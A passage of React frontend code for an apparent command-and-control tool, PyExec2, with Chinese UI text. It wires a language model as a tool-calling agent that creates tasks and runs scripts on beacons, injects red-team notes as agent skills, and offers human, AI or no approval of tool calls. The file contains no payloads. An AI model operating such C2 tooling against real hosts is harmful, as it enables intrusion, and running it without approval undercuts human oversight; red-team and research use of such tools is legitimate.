      setConfig(data); setApiKey(''); setBaseUrl(data.base_url || 'https://api.deepseek.com'); setModel(data.model || 'deepseek-flash'); setThinking(data.thinking || 'max'); setCompatMode(data.compat_mode === 'claude' ? 'claude' : 'openai'); setRolePrompt(data.role_prompt || ''); setTestResult(null); setModels([]); setApprovalMode('ai'); setSettingsOpen(false); setResetOpen(false)
    } catch (err) { setConfigMsg(err.message) } finally { setResetBusy(false) }
  }
  const finishRun = (seq, processQueue = true) => {
    if (seq !== runSeqRef.current) return
    busyRef.current = false; setBusy(false); setLiveStatus(''); setServerApprovalWait(null); currentRunIdRef.current = ''; abortRef.current = null
    if (processQueue && queueRef.current.length) {
      const next = queueRef.current.shift(); setQueue([...queueRef.current])
      setTimeout(() => startChat(next.text), 0)
    }
  }
  const handleStreamEvent = (event, seq) => {
    if (seq !== runSeqRef.current) return
    if (event.type === 'status') { setLiveStatus(event.text || 'AI 正在思考…'); return }
    if (event.type === 'thinking') {
      setLiveEvents(prev => [...prev, { kind: 'thinking', id: `think-${Date.now()}-${prev.length}`, label: 'AI 思考', content: event.text || '', thinking: '' }])
      setLiveStatus('AI 正在思考…')
      return
    }
    if (event.type === 'assistant_partial') {
      setLiveEvents(prev => [...prev, { kind: 'output', id: `partial-${Date.now()}-${prev.length}`, label: 'AI 输出', content: event.text || '', thinking: '' }])
      return
    }
    if (event.type === 'approval_wait') {
      setServerApprovalWait(event.approval || {})
      setLiveEvents(prev => [...prev, { kind: 'system', id: `approval-wait-${event.approval?.id || Date.now()}`, label: '等待人工审批', content: `审批请求：${event.approval?.action || '-'}\n审批 ID：${event.approval?.id || '-'}\n\nAI 已暂停执行，等待你在“审批”页面放行。放行后会自动继续执行并把结果返回给 AI。`, thinking: '' }])
      setLiveStatus(`等待人工审批：${event.approval?.id || ''}`)
      return
    }
    if (event.type === 'approval_resolved') {
      setServerApprovalWait(null)
      const approvedNow = event.approval?.status === 'approved'
      const suggestion = event.approval?.suggestion ? `\n\n人工建议：${event.approval.suggestion}` : ''
      setLiveEvents(prev => [...prev, { kind: 'system', id: `approval-done-${Date.now()}-${prev.length}`, label: approvedNow ? '审批已通过' : '审批已拒绝', content: approvedNow ? '人工已放行，工具正在执行，执行结果将返回给 AI 并继续原流程。' : `人工已拒绝该工具调用，拒绝建议已作为工具输出返回给 AI，AI 将据此重新规划。${suggestion}`, thinking: '' }])
      setLiveStatus(approvedNow ? '审批已通过，工具执行中…' : '审批已拒绝，AI 正在调整…')
      return
    }
    if (event.type === 'tool_call') {
      setLiveEvents(prev => [...prev, { kind: 'tool', id: event.id || `tool-${Date.now()}-${prev.length}`, label: event.approved === false ? '等待审批的工具' : '执行命令', trace: { tool: event.name, args: event.args, result: null } }])
      setLiveStatus(event.approved === false ? '等待人工审批工具调用…' : '正在执行工具…')
      return
    }
    if (event.type === 'tool_result') {
      setLiveEvents(prev => prev.map(item => item.kind === 'tool' && item.id === event.id ? { ...item, label: '执行命令', trace: { ...(item.trace || {}), result: event.result } } : item))
      setLiveStatus('工具结果已返回，AI 继续思考…')
      return
    }
    if (event.type === 'done') {
      const data = event.result || {}
      if (data.awaiting_approval) {
        setPendingApproval({ runId: data.run_id, tools: data.pending_tools || [], thinking: data.thinking || '', trace: data.trace || [] })
        setLiveStatus('等待人工审批工具调用…')
        return
      }
      if (data.aborted) {
        appendChatMessage({ role: 'assistant', system: true, content: '⛔ 当前 AI 对话已急停；服务端等待队列已清空，已下发任务不受影响。' })
        setLiveEvents([]); finishRun(seq, false); return
      }
      if (!data.ok) {
        setError(data.error || 'AI 请求失败'); setLiveEvents([]); finishRun(seq, true); return
      }
      appendChatMessage({ role: 'assistant', content: data.reply || '（没有返回文本）', trace: data.trace || [], thinking: data.thinking || '' })
      if (typeof data.memory_count === 'number') setConfig(prev => prev ? { ...prev, memory_count: data.memory_count } : prev)
      setLiveEvents([]); finishRun(seq, true)
    }
  }
  const consumeStream = async (url, body, seq) => {
    const controller = abortRef.current
    const res = await fetch(url, { method: 'POST', headers: { ...authHeaders(), 'Content-Type': 'application/json' }, body: JSON.stringify(body), signal: controller?.signal })
    if (!res.ok) {
      const detail = await res.json().catch(() => ({}))
      throw new Error(detail.error || `HTTP ${res.status}`)
    }
    const reader = res.body.getReader()
    const decoder = new TextDecoder()
    let buffer = ''
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      buffer += decoder.decode(value, { stream: true })
      let boundary
      while ((boundary = buffer.indexOf('\n\n')) >= 0) {
        const block = buffer.slice(0, boundary); buffer = buffer.slice(boundary + 2)
        const payload = block.split('\n').filter(line => line.startsWith('data:')).map(line => line.slice(5).trim()).join('\n')
        if (!payload) continue
        let event
        try { event = JSON.parse(payload) } catch { continue }
        handleStreamEvent(event, seq)
        if (event.type === 'done') return
      }
    }
  }
  const startChat = async (text) => {
    const seq = ++runSeqRef.current
    busyRef.current = true; setBusy(true); setLiveStatus('AI 正在连接模型…'); setLiveEvents([]); setServerApprovalWait(null); setError('')
    const next = [...messagesRef.current, { role: 'user', content: text }]
    messagesRef.current = next; setMessages(next)
    const runId = (crypto.randomUUID ? crypto.randomUUID() : `run_${Date.now()}_${Math.random().toString(16).slice(2)}`)
    currentRunIdRef.current = runId
    abortRef.current = new AbortController()
    try {
      await consumeStream('/api/ai-agent/stream', { run_id: runId, messages: next.filter(m => m.role === 'user' || m.role === 'assistant').map(m => ({ role: m.role, content: m.content })) }, seq)
    } catch (err) {
      if (seq !== runSeqRef.current || err.name === 'AbortError') return
      setError(err.message); setLiveEvents([]); finishRun(seq, true)
    }
  }
  const handleContinue = async (approved) => {
    if (!pendingApproval) return
    const seq = runSeqRef.current
    const runId = pendingApproval.runId
    setPendingApproval(null); setLiveStatus(approved ? '人工已放行，AI 继续执行…' : '人工已拒绝，AI 正在调整…')
    try {
      await consumeStream('/api/ai-agent/stream/continue', { run_id: runId, approved }, seq)
    } catch (err) { setError(err.message); setLiveEvents([]); finishRun(seq, true) }
  }
  const stopAgent = async (announce = true, clearQueue = true) => {
    runSeqRef.current += 1
    const runId = currentRunIdRef.current
    if (clearQueue) { queueRef.current = []; setQueue([]) }
    setPendingApproval(null); setServerApprovalWait(null)
    abortRef.current?.abort(); abortRef.current = null; busyRef.current = false; setBusy(false); setLiveStatus(''); setLiveEvents([]); currentRunIdRef.current = ''
    if (runId) {
      try { await localJson('/api/ai-agent/stop', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ run_id: runId }) }) } catch { /* already aborted */ }
    }
    if (announce) appendChatMessage({ role: 'assistant', system: true, content: '⛔ 已急停当前 AI 对话；服务端等待队列已清空，已下发任务不受影响。' })
  }
  const enqueueMessage = (text) => {
    const item = { id: `queue_${Date.now()}_${Math.random().toString(16).slice(2)}`, text }
    queueRef.current.push(item); setQueue([...queueRef.current])
  }
  const updateQueueText = (id, text) => {
    queueRef.current = queueRef.current.map(item => item.id === id ? { ...item, text } : item)
    setQueue([...queueRef.current])
  }
  const deleteQueueItem = (id) => {
    queueRef.current = queueRef.current.filter(item => item.id !== id)
    setQueue([...queueRef.current])
  }
  const insertQueued = async (id) => {
    const item = queueRef.current.find(row => row.id === id)
    if (!item) return
    queueRef.current = queueRef.current.filter(row => row.id !== id)
    setQueue([...queueRef.current])
    await stopAgent(false, false)
    appendChatMessage({ role: 'assistant', system: true, content: '⚡ 已将排队对话提升为插入对话，正在打断当前思路。' })
    await startChat(item.text)
  }
  const restartConversation = async () => {
    await stopAgent(false, true)
    const welcome = { ...AGENT_WELCOME }
    messagesRef.current = [welcome]
    setMessages([welcome])
    setInput('')
    setPendingApproval(null)
    setServerApprovalWait(null)
    setLiveEvents([])
    setLiveStatus('')
    setError('')
    queueRef.current = []
    setQueue([])
  }
  const send = async () => {
    const text = input.trim()
    if (!text) return
    setInput('')
    if (busyRef.current) { enqueueMessage(text); return }
    await startChat(text)
  }
  if (loading) return <div className="page"><div className="loader">正在加载 AI Agent…</div></div>
  if (!config) return <div className="page"><Banner text={error || 'AI 配置加载失败'} tone="error" /><button className="ghost" onClick={loadAgent}>重新加载 AI 配置</button></div>
  if (!config.api_key_set) return <div className="page ai-agent-page agent-setup-page">
    <header className="page-head"><div><div className="eyebrow">BUILT-IN AGENT</div><h1>AI 模式<span>_</span></h1><p>连接一个 OpenAI 兼容模型，让 Agent 通过真实工具调用操作 C2。</p></div><span className="agent-connection-badge">● 等待模型连接</span></header>
    <div className="agent-hero">
      <div className="agent-hero-mark">⌁</div>
      <div><div className="eyebrow">AGENT BOOTSTRAP</div><h2>连接 AI 模型</h2><p>配置服务地址与密钥后，先获取模型并做一次真实对话测试；只有模型真实回复“连接成功”才显示连接通过。</p></div>
    </div>
    <Panel title="连接配置" eyebrow="BASE URL / MODEL" className="agent-setup">
      <div className="agent-setup-grid">
        <div className="agent-form">
          <label>Base URL<input value={baseUrl} onChange={e => setBaseUrl(e.target.value)} placeholder="https://api.deepseek.com" /></label>
          <label>API Key<input type="password" value={apiKey} onChange={e => setApiKey(e.target.value)} placeholder="sk-..." /></label>
          <label>模型<div className="agent-inline-input"><input list="ai-model-options" value={model} onChange={e => setModel(e.target.value)} placeholder="deepseek-flash" /><button className="ghost" onClick={fetchModels} disabled={modelBusy}>{modelBusy ? '获取中…' : '自动获取'}</button></div><datalist id="ai-model-options">{models.map(item => <option key={item} value={item} />)}</datalist></label>
          <label>API 发送格式<select value={compatMode} onChange={e => setCompatMode(e.target.value)}><option value="openai">OpenAI</option><option value="claude">Anthropic</option></select></label>
          <div className="agent-test-row"><button className="ghost" onClick={testConnection} disabled={testBusy}>{testBusy ? '真实测试中…' : '测试 AI 连接'}</button>{testResult && <span className={`agent-test-result ${testResult.ok ? 'ok' : 'fail'}`}>{testResult.ok ? `连接成功 · ${testResult.elapsed_ms}ms` : `测试未通过${testResult.error ? ` · ${testResult.error}` : ''}`}</span>}</div>
          {testResult?.reply && <div className="agent-test-reply">AI 实际回复：{testResult.reply}</div>}
          {configMsg && <div className="banner info">{configMsg}</div>}
        </div>
        <div className="agent-form">
          <label>思考强度<select value={thinking} onChange={e => setThinking(e.target.value)}><option value="min">Min</option><option value="low">Low</option><option value="medium">Medium</option><option value="high">High</option><option value="max">Max（默认）</option></select></label>
          <label>工具审批模式<select value={approvalMode} onChange={e => setApprovalMode(e.target.value)}><option value="human">人工审批（每次工具都确认）</option><option value="ai">AI 审批</option><option value="none">无审批</option></select></label>
          <label>角色提示词<textarea value={rolePrompt} onChange={e => setRolePrompt(e.target.value)} /></label>
          <div className="hint">系统只支持两种 API 发送格式：OpenAI Chat Completions 和 Anthropic Claude Messages。模型列表和连接测试都会按所选格式调用。</div>
          <button className="primary" onClick={saveConfig}>保存并进入 AI 模式</button>
        </div>
      </div>
    </Panel>
  </div>
  const traceItems = []
  messages.forEach((message, messageIndex) => {
    if (message.role === 'user' && message.content) traceItems.push({ kind: 'input', label: '用户输入', content: message.content, index: messageIndex + 1 })
    if (message.role === 'assistant' && message.content) traceItems.push({ kind: message.system ? 'system' : 'output', label: message.system ? '系统事件' : 'AI 输出', content: message.content, thinking: message.thinking || '', index: messageIndex + 1 })
    for (const trace of message.trace || []) traceItems.push({ kind: 'tool', label: '执行命令', trace, index: messageIndex + 1 })
  })
  for (const event of liveEvents) traceItems.push({ ...event, index: traceItems.length + 1 })
  if (liveStatus) traceItems.push({ kind: 'live', label: '运行中', content: liveStatus, index: traceItems.length + 1 })
  return <div className="page ai-agent-page">
    <header className="page-head"><div><div className="eyebrow">BUILT-IN AGENT</div><h1>AI 模式<span>_</span></h1><p>内置 PyExec2 Agent · 可操作 C2 全部 Action · 独立记忆最多 200 条</p></div><div className="ai-agent-head-actions"><span className="micro">{config.model} · THINKING {String(config.thinking || 'max').toUpperCase()} · APPROVAL {approvalMode.toUpperCase()}</span><button className="ghost" onClick={restartConversation}>重新开始对话</button><button className="ghost" onClick={openMemoryManager}>查看记忆 ({memory.length})</button><button className="ghost danger" onClick={() => setResetOpen(true)}>回退基础设置</button><button className="ghost" onClick={() => setSettingsOpen(true)}>AI 配置</button></div></header>
    <div className="ai-agent-layout">
      <Panel title="Agent 对话" eyebrow="TOOL-CALLING C2 AGENT" className="agent-chat-panel" right={<button className={chatMarkdown ? 'primary' : 'ghost'} onClick={() => setChatMarkdown(prev => !prev)}>{chatMarkdown ? 'Markdown 已开启' : 'Markdown 已关闭'}</button>}>
        <div className="agent-chat-log" ref={chatLogRef} onScroll={onChatScroll}>{messages.map((message, index) => <div key={index} className={`chat-msg ${message.role}`}><div className="chat-role">{message.role === 'user' ? 'OPERATOR' : 'AGENT'}</div>{message.thinking && <details className="chat-thinking" open><summary>思考过程</summary><pre>{message.thinking}</pre></details>}{chatMarkdown ? <div className="chat-content markdown"><ReactMarkdown remarkPlugins={[remarkGfm, remarkBreaks]} components={{ a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer" /> }}>{message.content}</ReactMarkdown></div> : <div className="chat-content">{message.content}</div>}{message.trace?.length > 0 && <details className="chat-trace"><summary>工具调用 {message.trace.length}</summary>{message.trace.map((trace, i) => <div key={i}><code>{trace.tool}</code><pre>{JSON.stringify(trace.args, null, 2)}{'\n→\n'}{JSON.stringify(trace.result, null, 2).slice(0, 2000)}</pre></div>)}</details>}</div>)}{busy && <div className="chat-msg assistant live"><div className="chat-role">AGENT · LIVE</div><div className="chat-content">{liveStatus || 'AI 正在思考并调用工具…'}</div></div>}</div>
        {serverApprovalWait && <div className="agent-server-approval-banner"><span className="approval-wait-dot" /><div><strong>AI 已暂停，等待人工审批</strong><small>{serverApprovalWait.action || '工具调用'} · {serverApprovalWait.id || ''}</small></div><button className="primary" onClick={() => onOpenApprovals?.()}>前往审批</button></div>}
        {error && <div className="banner error">{error}</div>}
        <div className="agent-chat-input"><textarea value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send() } }} placeholder="发送消息。AI 正在执行时会自动排队；Shift+Enter 换行。" /><button className="primary" onClick={send}>发送</button><button className="ghost danger" onClick={() => stopAgent(true)} disabled={!busy}>急停</button></div>
      </Panel>
      <Panel title="AI 执行轨迹" eyebrow="GIT-LIKE ACTIVITY" className="agent-trace-panel">
        <div className="agent-trace-timeline" ref={traceRef} onScroll={onTraceScroll}>{traceItems.map((item, index) => <div className={`agent-trace-item ${item.kind}`} key={`${item.kind}-${item.index}-${index}`}><span className="agent-trace-dot" /><div className="agent-trace-card"><div className="agent-trace-head"><span>{item.label}</span><small>#{item.index}</small></div>{item.kind === 'tool' ? <><div className="agent-trace-action"><code>{item.trace.tool}</code>{item.trace.args?.action && <strong>{item.trace.args.action}</strong>}</div><pre className="agent-trace-command">{JSON.stringify(item.trace.args, null, 2)}</pre><details open className="agent-trace-result"><summary>执行结果</summary><pre>{JSON.stringify(item.trace.result, null, 2)}</pre></details></> : <><pre className="agent-trace-content">{item.content}</pre>{item.thinking && <pre className="agent-trace-thinking">思考过程：{item.thinking}</pre>}</>}</div></div>)}{!traceItems.length && <div className="empty">还没有执行轨迹</div>}</div>
      </Panel>
    </div>
    <Panel title="排队对话" eyebrow="QUEUED CONVERSATIONS" className="agent-queue-panel-bottom" right={<span className="micro">{queue.length} 条 · ↑ 插入当前对话 · × 删除</span>}>
      <div className="agent-queue-list">{queue.map((item, index) => <div className="agent-queue-row" key={item.id}><span className="agent-queue-index">{index + 1}</span><input value={item.text} onChange={e => updateQueueText(item.id, e.target.value)} /><button className="agent-queue-up" title="改为插入对话" onClick={() => insertQueued(item.id)}>↑</button><button className="agent-queue-delete" title="删除排队对话" onClick={() => deleteQueueItem(item.id)}>×</button></div>)}{!queue.length && <div className="empty">暂无排队对话</div>}</div>
    </Panel>
    {settingsOpen && <div className="modal-back"><div className="modal agent-settings-modal"><div className="modal-head"><div><div className="eyebrow">AGENT CONFIGURATION</div><h2>AI 配置</h2><p className="micro">修改模型、提示词和 Skills。</p></div><button className="ghost" onClick={() => setSettingsOpen(false)}>关闭</button></div>
      <div className="agent-form compact">
        <label>Base URL<input value={baseUrl} onChange={e => setBaseUrl(e.target.value)} /></label>
        <label>API Key<input type="password" value={apiKey} onChange={e => setApiKey(e.target.value)} placeholder={config.api_key_set ? `已设置，尾号 ${config.api_key_hint}；留空不修改` : 'sk-...'} /></label>
        <label>模型<div className="agent-inline-input"><input list="ai-model-options" value={model} onChange={e => setModel(e.target.value)} /><button className="ghost" onClick={fetchModels} disabled={modelBusy}>{modelBusy ? '…' : '获取'}</button></div><datalist id="ai-model-options">{models.map(item => <option key={item} value={item} />)}</datalist></label>
        <label>思考强度<select value={thinking} onChange={e => setThinking(e.target.value)}><option value="min">Min</option><option value="low">Low</option><option value="medium">Medium</option><option value="high">High</option><option value="max">Max（默认）</option></select></label>
        <label>API 发送格式<select value={compatMode} onChange={e => setCompatMode(e.target.value)}><option value="openai">OpenAI</option><option value="claude">Anthropic</option></select></label>
        <label>工具审批模式<select value={approvalMode} onChange={e => setApprovalMode(e.target.value)}><option value="human">人工审批（每次工具都确认）</option><option value="ai">AI 审批</option><option value="none">无审批</option></select></label>
        <div className="hint">服务端“逐条审批”开启时，AI Agent 的写操作会以 AI Worker 身份进入审批页面；AI 不能审批自己的操作。</div>
        <label>角色提示词<textarea value={rolePrompt} onChange={e => setRolePrompt(e.target.value)} /></label>
        <div className="agent-skill-config"><div className="agent-skill-head"><strong>Skills</strong><span className="micro">红队笔记注入</span></div>{skillNotes.map(note => <label className="agent-skill-row" key={note.id}><input type="checkbox" checked={Boolean(note.ai_skill)} onChange={() => toggleSkill(note)} /><span>{note.title || '未命名红队笔记'}</span><small>{note.ai_skill ? '已启用' : '未启用'}</small></label>)}{!skillNotes.length && <div className="hint">还没有红队笔记。可在记事本页面创建后在这里启用。</div>}</div>
        <div className="agent-test-row"><button className="ghost" onClick={testConnection} disabled={testBusy}>{testBusy ? '测试中…' : '测试连接'}</button>{testResult && <span className={`agent-test-result ${testResult.ok ? 'ok' : 'fail'}`}>{testResult.ok ? `连接成功 · ${testResult.elapsed_ms}ms` : '测试未通过'}</span>}</div>
        {testResult?.reply && <div className="agent-test-reply">AI 回复：{testResult.reply}</div>}
        <div className="modal-actions"><button className="primary" onClick={saveConfig}>保存设置</button></div>
        {configMsg && <div className="hint">{configMsg}</div>}
      </div>
    </div></div>}
    {pendingApproval && <div className="modal-back"><div className="modal agent-approval-modal"><div className="modal-head"><div><div className="eyebrow">HUMAN APPROVAL</div><h2>AI 请求执行工具</h2><p className="micro">人工审批模式下，每个工具调用都必须由你确认。</p></div></div><div className="agent-approval-body">{pendingApproval.thinking && <details className="chat-thinking" open><summary>AI 思考</summary><pre>{pendingApproval.thinking}</pre></details>}{(pendingApproval.tools || []).map((tool, i) => <div className="agent-approval-tool" key={i}><strong>{tool.name}</strong><pre>{JSON.stringify(tool.args, null, 2)}</pre></div>)}</div><div className="modal-actions"><button className="ghost danger" onClick={() => handleContinue(false)}>拒绝</button><button className="primary" onClick={() => handleContinue(true)}>允许执行</button></div></div></div>}
    {memoryModalOpen && <div className="modal-back"><div className="modal agent-memory-modal memory-manager-modal"><div className="modal-head"><div><div className="eyebrow">DURABLE MEMORY</div><h2>记忆管理</h2><p className="micro">左侧选择记忆标题，右侧查看或编辑标题和完整内容。最多 200 条。</p></div><button className="ghost" onClick={() => setMemoryModalOpen(false)}>关闭</button></div><div className="memory-manager-layout"><div className="memory-manager-side"><button className="primary" onClick={newMemory}>＋ 新建记忆</button><div className="memory-manager-list">{memory.map(item => <button key={item.id} className={`memory-manager-item ${memoryModalItem?.id === item.id ? 'active' : ''}`} onClick={() => openMemoryModal(item)}><strong>{item.title || '未命名记忆'}</strong><small>{item.updated_at?.slice(0, 16) || item.created_at?.slice(0, 16) || ''}</small></button>)}{!memory.length && <div className="empty">还没有记忆</div>}</div></div><div className="agent-form compact memory-manager-editor"><label>标题<input value={memoryTitle} onChange={e => setMemoryTitle(e.target.value)} placeholder="记忆标题" /></label><label>内容<textarea className="memory-content-editor" value={memoryContent} onChange={e => setMemoryContent(e.target.value)} placeholder="记忆实际内容…" /></label><div className="modal-actions">{memoryModalItem && <button className="ghost danger" onClick={() => deleteMemory(memoryModalItem)}>删除</button>}<button className="ghost" onClick={() => setMemoryModalOpen(false)}>关闭</button><button className="primary" onClick={saveMemoryModal} disabled={memoryBusy}>{memoryBusy ? '保存中…' : '保存'}</button></div>{configMsg && <div className="hint">{configMsg}</div>}</div></div></div></div>}
    {resetOpen && <div className="modal-back"><div className="modal agent-reset-modal"><div className="modal-head"><div><div className="eyebrow">RESET AI CONFIGURATION</div><h2>回退基础设置？</h2><p className="micro">这会删除当前保存的 Base URL、API Key 和 AI 配置，并回到首次连接界面。记忆和红队笔记不会删除。</p></div></div><div className="modal-actions"><button className="ghost" onClick={() => setResetOpen(false)} disabled={resetBusy}>取消</button><button className="ghost danger" onClick={resetConfig} disabled={resetBusy}>{resetBusy ? '正在回退…' : '确认回退并作废 API Key'}</button></div></div></div>}
  </div>
}

function Notebooks() {
  const [items, setItems] = useState([])
  const [selectedId, setSelectedId] = useState('')
  const [title, setTitle] = useState('')
  const [content, setContent] = useState('')
  const [dirty, setDirty] = useState(false)
  const [category, setCategory] = useState('standard')
  const [aiSkill, setAiSkill] = useState(false)
  const [createOpen, setCreateOpen] = useState(false)
  const [mode, setMode] = useState('edit')
  const [message, setMessage] = useState('')
  const [busy, setBusy] = useState(false)
  const [deleteArmed, setDeleteArmed] = useState(false)
  const auth = () => ({ 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' })
  const request = async (url, options = {}) => {
    const res = await fetch(url, { ...options, headers: { ...auth(), ...(options.headers || {}) } })
    const data = await res.json().catch(() => ({}))
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`)
    return data
  }
  const selectItem = (item) => {
    setSelectedId(item.id); setTitle(item.title || ''); setContent(item.content || ''); setCategory(item.category === 'redteam' ? 'redteam' : 'standard'); setAiSkill(Boolean(item.ai_skill)); setDirty(false); setMode('edit'); setDeleteArmed(false); setMessage('')
  }
  const load = async () => {
    try {
      const data = await request('/api/notebooks')
      const list = data.items || []; setItems(list)
      if (list.length && !selectedId) selectItem(list[0])
      if (!list.length) { setSelectedId(''); setTitle(''); setContent('') }
    } catch (err) { setMessage(err.message) }
  }
  useEffect(() => { load() }, [])
  const saveCurrent = async () => {
    if (!selectedId) return
    setBusy(true); setMessage('')
    try {
      const data = await request(`/api/notebooks/${selectedId}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ title, content, ai_skill: aiSkill }) })
      setItems(prev => prev.map(item => item.id === selectedId ? data.item : item))
      setDirty(false); setMessage(`已保存 · ${data.item.updated_at}`)
    } catch (err) { setMessage(err.message) } finally { setBusy(false) }
  }
  const createNotebook = async (kind = 'standard') => {
    if (dirty && selectedId) await saveCurrent()
    setBusy(true); setMessage(''); setCreateOpen(false)
    try {
      const isRedteam = kind === 'redteam'
      const data = await request('/api/notebooks', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ title: isRedteam ? '未命名红队笔记' : '未命名记事本', content: '', category: kind, ai_skill: isRedteam }) })
      setItems(prev => [data.item, ...prev]); selectItem(data.item); setMessage(isRedteam ? '红队笔记已创建' : '新记事本已创建')
    } catch (err) { setMessage(err.message) } finally { setBusy(false) }
  }
  const openNotebook = async (item) => {
    if (item.id === selectedId) return
    if (dirty && selectedId) await saveCurrent()
    selectItem(item)
  }
  const deleteNotebook = async () => {
    if (!selectedId) return
    if (!deleteArmed) { setDeleteArmed(true); return }
    setBusy(true); setMessage('')
    try {
      await request(`/api/notebooks/${selectedId}`, { method: 'DELETE' })
      const remaining = items.filter(item => item.id !== selectedId)
      setItems(remaining); if (remaining.length) selectItem(remaining[0]); else { setSelectedId(''); setTitle(''); setContent('') }
      setDeleteArmed(false); setMessage('记事本已删除')
    } catch (err) { setMessage(err.message) } finally { setBusy(false) }
  }
  const standardItems = items.filter(item => item.category !== 'redteam')
  const redteamItems = items.filter(item => item.category === 'redteam')
  const notebookRow = (item) => <button key={item.id} className={`notebook-item ${item.id === selectedId ? 'active' : ''} ${item.category === 'redteam' ? 'redteam' : ''}`} onClick={() => openNotebook(item)}><strong>{item.title || (item.category === 'redteam' ? '未命名红队笔记' : '未命名记事本')}</strong><small>{item.updated_at?.slice(0, 16) || ''}{item.category === 'redteam' && item.ai_skill ? ' · AI SKILL' : ''}</small></button>
  return <div className="page notebook-page">
    <header className="page-head"><div><div className="eyebrow">LOCAL NOTEBOOK</div><h1>记事本<span>_</span></h1><p>标准记事本与红队笔记分区保存；红队笔记可注入 AI Agent 作为技能。</p>{message && <span className="hint">{message}</span>}</div><button className="primary" onClick={() => setCreateOpen(true)} disabled={busy}>＋ 新建</button></header>
    <div className="notebook-layout">
      <Panel title="记事本列表" eyebrow="DOCUMENTS" className="notebook-list-panel" right={<span className="micro">{items.length}</span>}>
        <div className="notebook-split">
          <div className="notebook-section"><div className="notebook-section-head"><span>标准记事本</span><small>{standardItems.length}</small></div><div className="notebook-list">{standardItems.map(notebookRow)}{!standardItems.length && <div className="empty">还没有普通记事本</div>}</div></div>
          <div className="notebook-section redteam"><div className="notebook-section-head"><span>红队笔记</span><small>{redteamItems.length}</small></div><div className="notebook-list">{redteamItems.map(notebookRow)}{!redteamItems.length && <div className="empty">还没有红队笔记</div>}</div></div>
        </div>
      </Panel>
      <Panel title={title || '未选择记事本'} eyebrow="EDITOR / MARKDOWN" className="notebook-editor-panel" right={selectedId ? <div className="quick-buttons"><button className={mode === 'edit' ? 'primary' : 'ghost'} onClick={() => setMode('edit')}>编辑</button><button className={mode === 'preview' ? 'primary' : 'ghost'} onClick={() => setMode('preview')}>Markdown 预览</button></div> : null}>
        {selectedId ? <div className="notebook-editor">
          <div className="notebook-title-row"><span className={`notebook-category-badge ${category === 'redteam' ? 'redteam' : ''}`}>{category === 'redteam' ? '红队笔记' : '标准记事本'}</span><input value={title} onChange={e => { setTitle(e.target.value); setDirty(true) }} placeholder="记事本标题" /><span className="micro">{content.length} 字符</span></div>
          {category === 'redteam' && <label className="notebook-skill-toggle"><input type="checkbox" checked={aiSkill} onChange={e => { setAiSkill(e.target.checked); setDirty(true) }} /> 作为 AI Skill 注入 Agent 系统提示词</label>}
          {mode === 'edit' ? <textarea className="notebook-textarea" value={content} onChange={e => { setContent(e.target.value); setDirty(true) }} onKeyDown={e => { if ((e.ctrlKey || e.metaKey) && e.key === 's') { e.preventDefault(); saveCurrent() } }} placeholder="在这里写内容，支持 Markdown… Ctrl/⌘+S 保存" spellCheck={false} /> : <div className="notebook-preview"><ReactMarkdown remarkPlugins={[remarkGfm, remarkBreaks]} components={{ a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer" /> }}>{content || '*还没有内容*'}</ReactMarkdown></div>}
          <div className="notebook-actions"><span className="hint">{dirty ? '有未保存修改' : '已保存'}</span><button className="ghost danger" onClick={deleteNotebook} disabled={busy}>{deleteArmed ? '确认删除' : '删除'}</button><button className="primary" onClick={saveCurrent} disabled={busy || !dirty}>{busy ? '保存中…' : '保存'}</button></div>
        </div> : <div className="empty">选择左侧记事本，或新建一个开始记录。</div>}
      </Panel>
    </div>
    {createOpen && <div className="modal-back"><div className="modal notebook-create-modal"><div className="modal-head"><div><div className="eyebrow">NEW DOCUMENT</div><h2>新建什么？</h2><p className="micro">普通记事本用于日常记录；红队笔记可被 AI Agent 当作技能读取。</p></div><button className="ghost" onClick={() => setCreateOpen(false)}>关闭</button></div><div className="notebook-create-options"><button onClick={() => createNotebook('standard')}><strong>标准记事本</strong><span>普通 Markdown 文本记录</span></button><button className="redteam" onClick={() => createNotebook('redteam')}><strong>红队笔记</strong><span>可注入 AI Agent 作为红队 Skill</span></button></div></div></div>}
  </div>
}

function Approvals({ approvals, status, refresh }) {
  const [filter, setFilter] = useState('pending')
  const [msg, setMsg] = useState('')
  const [busy, setBusy] = useState(false)
  const [detail, setDetail] = useState(null)
  const [rejectAdvice, setRejectAdvice] = useState('')
  const list = approvals.filter(a => filter === 'all' || a.status === filter)
  const detailRecord = detail ? (approvals.find(a => a.id === detail.id) || detail) : null
  const approvalCommandText = (record) => {
    const args = record?.args || {}
    if (record?.action === 'task.create') {
      return `action: task.create\nbeacon_id: ${args.beacon_id || '-'}\nplugin: ${args.plugin || '-'}\nargs:\n${JSON.stringify(args.args || {}, null, 2)}`
    }
    if (record?.action === 'script.run') {
      return `action: script.run\nbeacon_id: ${args.beacon_id || '-'}\nsource:\n${args.source || ''}`
    }
    return `action: ${record?.action || '-'}\nargs:\n${JSON.stringify(args, null, 2)}`
  }
  const resolve = async (id, verb, suggestion = '') => {
    setBusy(true); setMsg('')
    try {
      const payload = verb === 'approve' ? { approval_id: id } : { approval_id: id, suggestion: String(suggestion || '').trim() }
      const result = await action(verb === 'approve' ? 'approval.approve' : 'approval.reject', payload)
      if (result?.status === 'approval_required') setMsg(`该操作自身需要审批：${result.approval?.id || ''}`)
      else {
        setMsg(verb === 'approve' ? `已放行 ${id}` : (payload.suggestion ? `已拒绝并返回建议 ${id}` : `已拒绝 ${id}`))
        setDetail(null); setRejectAdvice('')
      }
      await refresh()
    } catch (err) { setMsg(err.message) } finally { setBusy(false) }
  }
  const openDetail = (record) => { setDetail(record); setRejectAdvice('') }
  const resolveAll = async (verb) => {
    setBusy(true); setMsg('')
    try {
      const result = await action(verb === 'approve' ? 'approval.approve_all' : 'approval.reject_all')
      setMsg(JSON.stringify(result))
      await refresh()
    } catch (err) { setMsg(err.message) } finally { setBusy(false) }
  }
  const setMode = async (mode) => {
    setBusy(true); setMsg('')
    try {
      const result = await action('server.config.set', { approval_mode: mode })
